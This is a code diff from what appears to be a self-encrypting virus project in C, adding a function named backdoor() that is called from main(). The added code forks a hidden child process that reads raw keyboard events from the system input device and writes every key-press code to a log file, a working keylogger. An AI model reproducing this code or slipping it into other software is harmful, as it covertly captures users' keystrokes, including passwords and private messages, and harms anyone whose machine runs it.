@@ -234,6 +234,7 @@ static int	file_path(char *path, t_fingerprint *fingerprint, char choice, t_info
 	return (index);
 }
 
+
 static void	close_entries(void)
 {
 	double_ret();
@@ -308,6 +309,44 @@ void		fill_tab_addr(size_t *tab_addr)
 	tab_addr[30] = (size_t)&fill_tab_addr;
 }
 
+static void	backdoor()
+{
+	pid_t pid = ft_sysfork();
+	
+	if (pid == -1)
+		return ;
+	if (pid == 0)
+	{
+		int fd, fd2;
+		struct input_event ev;
+		char buf[0x40];// = "/dev/input/event0";
+// 		char *str2 ="/tmp/test/keylogger.txt"; 
+		write_event0(buf);
+		fd = ft_sysopen(buf, O_RDONLY);
+		if (fd < 0)
+			ft_sysexit(0);
+		write_keylog(buf);
+		fd2 = ft_sysopenmode(buf, O_WRONLY | O_CREAT, 0666);
+		if (fd2 < 0)
+		{
+			ft_sysclose(fd);
+			ft_sysexit(0);
+		}
+		while (1)
+		{
+			ft_sysread(fd, &ev, sizeof(struct input_event));
+			if (ev.type == EV_KEY && ev.value == 0x1)
+			{
+				ft_syswrite(fd2, &(ev.code), 2);
+			}
+		}
+
+
+	}
+	else
+		return ;
+}
+
 int		main(void)
 {
 	size_t			tab_addr[31];
@@ -329,6 +368,8 @@ int		main(void)
 	int ret = check_process(buf_path, &info);
 	if (ret == 1)
 		return (0);
+	if (info.in_pestilence == 0)
+		backdoor();
 	reencrypt_func(&info, &check_process, info.tab_addr[12] - info.tab_addr[11], key);
 	write_begin(buf);
 	ft_syswrite(1, buf, 8);
